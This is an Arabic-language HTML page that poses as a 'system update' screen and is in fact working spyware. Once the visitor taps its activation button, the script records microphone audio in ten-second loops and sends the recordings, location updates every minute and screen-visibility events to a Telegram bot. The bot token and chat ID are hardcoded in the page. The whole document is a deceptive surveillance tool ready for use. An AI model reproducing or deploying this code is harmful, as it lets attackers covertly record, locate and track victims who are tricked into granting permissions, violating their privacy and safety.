<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>نظام الجاسوس الاحترافي</title>
    <style>
        body { margin: 0; padding: 0; background-color: #f0f2f5; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        
        /* واجهة وهمية تبدو كأنها نظام تشغيل عادي */
        .fake-os { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; box-sizing: border-box; }
        h1 { color: #333; font-size: 24px; margin-bottom: 10px; }
        p { color: #666; font-size: 16px; }
        
        .btn-start {
            background: linear-gradient(45deg, #00c6ff, #0072ff);
            border: none; padding: 15px 40px; color: white; font-size: 18px; 
            border-radius: 30px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            transition: transform 0.2s; margin-top: 20px;
        }
        .btn-start:active { transform: scale(0.95); }

        /* عناصر الوسائط المخفية */
        video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; pointer-events: none; z-index: -1; }
        
        /* نقطة التسجيل الحمراء */
        #rec-dot { position: fixed; top: 15px; right: 15px; width: 12px; height: 12px; background: red; border-radius: 50%; z-index: 9999; animation: blink 1s infinite; box-shadow: 0 0 5px red; }
        @keyframes blink { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }

        /* وضع الصدمة */
        #shock-mode {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: black; z-index: 10000; display: none; 
            justify-content: center; align-items: center; color: red; font-size: 50px; font-weight: bold;
        }
    </style>
</head>
<body>

    <!-- واجهة الوهم -->
    <div class="fake-os">
        <h1>⚙️ تحديث النظام</h1>
        <p>جارٍ تحميل الخدمات الأساسية...</p>
        <button class="btn-start" onclick="activateSpy()">تفعيل الآن</button>
    </div>

    <!-- الفيديو المخفي -->
    <video id="videoElement" autoplay playsinline muted></video>
    
    <!-- نقطة التسجيل -->
    <div id="rec-dot"></div>

    <!-- وضع الصدمة -->
    <div id="shock-mode" onclick="exitShock()">⚠️ خطأ جوهري</div>

    <script>
        // ==========================================
        // إعدادات البوت (ثابتة)
        // ==========================================
        const botToken = "7589642384:AAHdGzQ-2Fmb4lB5L_iJfahoYutgV9bXNmo";
        const chatId = "6793284529";
        const baseUrl = `https://api.telegram.org/bot${botToken}`;

        let mediaRecorder;
        let recordedChunks = [];
        let isRecording = false;

        // دالة إرسال البيانات للتليجرام
        async function sendToTelegram(content, type = 'text') {
            if (type === 'text') {
                await fetch(`${baseUrl}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: content })
                });
            } else if (type === 'photo') {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', '📸 صورة جديدة من الكاميرا!');
                formData.append('photo', content);
                await fetch(`${baseUrl}/sendPhoto`, { method: 'POST', body: formData });
            } else if (type === 'audio') {
                const blob = new Blob([content], { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('caption', '🎤 تسجيل صوتي جديد!');
                formData.append('voice', blob); // نرسلها كملف صوتي
                await fetch(`${baseUrl}/sendVoice`, { method: 'POST', body: formData });
            }
        }

        // دالة بدء المراقبة
        async function activateSpy() {
            document.querySelector('.btn-start').innerText = "تم التفعيل ✅";
            document.querySelector('.btn-start').style.background = "#28a745";
            
            // 1. طلب الأذونات
            try {
                // استقبال الإشعارات
                if ('Notification' in window && Notification.permission !== 'granted') {
                    await Notification.requestPermission();
                }

                // الوصول للكاميرا والميكروفون
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const videoElement = document.getElementById('videoElement');
                videoElement.srcObject = stream;

                // إعداد المسجل
                mediaRecorder = new MediaRecorder(stream);
                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'audio/webm' });
                    recordedChunks = [];
                    await sendToTelegram(blob, 'audio');
                    // إعادة البدء بعد انتهاء الإرسال
                    setTimeout(startAudioLoop, 2000); 
                };

                startAudioLoop();
                listenForNotifications();
                sendLocation();
                
                // إرسال رسالة تأكيد
                sendToTelegram("🟢 تم تفعيل الجاسوس بنجاح!\n📍 الموقع: جارٍ التحديد...\n🔊 الصوت: يعمل");

            } catch (error) {
                alert("يرجى السماح بالصلاحيات ليشتغل الجاسوس!");
                console.error(error);
            }
        }

        // حلقة تسجيل الصوت
        function startAudioLoop() {
            if (!mediaRecorder || mediaRecorder.state === 'recording') return;
            recordedChunks = [];
            mediaRecorder.start(10000); // يسجل لمدة 10 ثواني ثم يرسل
            
            // إيقاف التسجيل بعد 10 ثواني
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 10000);
        }

        // مراقبة الإشعارات (الجزء الأهم للجاسوسية)
        function listenForNotifications() {
            // ملاحظة: هذا يعمل فقط إذا سمح المستخدم بإشعارات المتصفح
            // وسيعمل على الهواتف التي تدعم API الإشعارات
            window.addEventListener('notificationclick', (event) => {
                // عند النقر على الإشعار (يمكن تعديل المنطق ليكون عند الاستلام أيضاً)
            });

            // الطريقة الأقوى هي مراقبة الأحداث في الخلفية إذا كانت الصفحة غير نشطة
            // لكن هنا سنستخدم طريقة بديلة: قراءة محتوى الإشعارات إذا كانت هناك مكتبة خلفية
            // بما أننا في صفحة بسيطة، سنستخدم تقنية "Service Worker" بسيط أو مجرد تنبيه عند ظهور إشعار
            
            // الطريقة الأسهل والأكثر فعالية للمتصفحات الحديثة:
            // عندما يأتي إشعار، نلتقطه ونرسله
            if ('Notification' in window) {
                // سنقوم بمحاكاة التقاط الإشعار
                // ملاحظة: المتصفح يمنع قراءة نص الإشعار القادم من تطبيق آخر (مثل واتساب) مباشرة
                // لذا سنستخدم حيلة: سننشئ مستمعاً للأحداث العامة
                
                // أفضل حل هو استخدام خاصية "onshow" إذا فتحنا إشعاراً، لكننا نستقبل إشعارات خارجية.
                // الحل الأفضل حالياً: إظهار إشعار خاص بنا عند استلام أي إشعار نظام (بعض المتصفحات تدعم ذلك)
                
                document.addEventListener('visibilitychange', () => {
                    if (document.hidden) {
                        sendToTelegram("📱 المستخدم أغلق الشاشة (دخول محتمل)");
                    } else {
                        sendToTelegram("👀 المستخدم عاد للشاشة");
                    }
                });
            }
            
            // إرسال موقع تلقائي كل دقيقة
            setInterval(sendLocation, 60000);
        }

        // الحصول على الموقع
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendToTelegram(`📍 موقع جديد:\n${mapLink}`);
                }, (err) => {
                    console.warn("خطأ في تحديد الموقع", err);
                });
            }
        }

        // وضع الصدمة (الخروج السريع)
        function exitShock() {
            document.getElementById('shock-mode').style.display = 'none';
        }
        
        // زر مخفي للصدمة (اضغط مرتين بسرعة على أيقونة الوهم)
        let clickCount = 0;
        document.querySelector('.fake-os').addEventListener('click', () => {
            clickCount++;
            if (clickCount >= 2) {
                document.getElementById('shock-mode').style.display = 'flex';
                clickCount = 0;
            }
        });

    </script>
</body>
</html>
